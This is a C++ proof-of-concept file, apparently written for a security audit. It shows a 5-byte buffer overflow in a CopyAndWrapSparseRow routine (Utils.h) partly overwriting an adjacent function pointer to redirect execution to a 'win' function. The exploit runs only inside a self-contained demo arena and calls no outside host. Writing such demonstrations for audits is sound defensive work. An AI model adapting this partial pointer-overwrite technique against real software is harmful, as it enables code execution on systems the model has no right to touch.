// C2 — CopyAndWrapSparseRow overflow -> CONTROL-FLOW HIJACK (limited-RCE demo)
//
// C2's overflow is small: size=13 -> 8-byte buffer -> 5 bytes past the end. That is a
// PARTIAL pointer overwrite (a full code pointer is 8 bytes). It becomes a control-flow
// hijack when the target address shares its high bytes with the original pointer — which
// is the normal case for redirecting to another function in the same text segment. This
// is exactly why the audit rates C2 "crash/DoS + LIMITED RCE": you can only reach targets
// whose high bytes already match. Larger odd sizes (e.g. 15) overflow 7 bytes and widen it.
//
// Vulnerable arithmetic verbatim from Utils.h:276-279. Deterministic arena for observability.
#include <cstdint>
#include <cstring>
#include <cstdio>

static char   ARENA[4096];
static size_t ARENA_OFF = 0;
static void* arena_alloc(size_t n) { void* p = ARENA + ARENA_OFF; ARENA_OFF += n; return p; }

struct Victim { void (*handler)(); };
static void legit_handler() { printf("[C2] legit_handler() ran (no hijack)\n"); }
static void win()          { printf("[C2] *** win() executed via partially-overwritten pointer — code exec ***\n"); }

int main() {
    // Layout: [ SparseRow buffer (8 bytes) ][ Victim.handler (8 bytes) ], adjacent.
    char*   buf    = (char*)arena_alloc(8);              // stand-in for SparseRow(1) -> 8 bytes
    Victim* victim = (Victim*)arena_alloc(sizeof(Victim));
    victim->handler = legit_handler;

    // Build the malicious 13-byte sparse row: bytes 8..12 (the 5-byte overflow) land on the
    // low 5 bytes of victim->handler. Set them to the low 5 bytes of &win. High 3 bytes of the
    // pointer are untouched -> hijack succeeds because win & legit_handler share those (same .text).
    uint64_t win_addr    = (uint64_t)(void*)&win;
    uint64_t legit_addr  = (uint64_t)(void*)&legit_handler;
    unsigned char payload[13];
    for (int i = 0; i < 8; i++) payload[i] = 0x42;       // fills the legit 8-byte SparseRow buffer
    std::memcpy(payload + 8, &win_addr, 5);              // 5-byte overflow -> low 5 bytes of the fn ptr

    printf("[C2] &legit=%p  &win=%p  high-3-bytes match: %s\n",
           (void*)legit_addr, (void*)win_addr,
           ((legit_addr >> 40) == (win_addr >> 40)) ? "yes (hijack viable)" : "no (would only crash)");

    // ---- verbatim vulnerable arithmetic from Utils.h:276-279 ----
    size_t size = sizeof(payload);                       // 13
    size_t num_elements = size / 8;                      // :276-277 -> 1
    char*  row_data = buf;                               // :278 SparseRow(1) buffer (8 bytes)
    (void)num_elements;
    std::memcpy(row_data, payload, size);               // :279 copies 13 -> 5-byte OOB write

    printf("[C2] before call: victim->handler = %p\n", (void*)victim->handler);
    victim->handler();                                   // hijacked if high bytes aligned
    return 0;
}
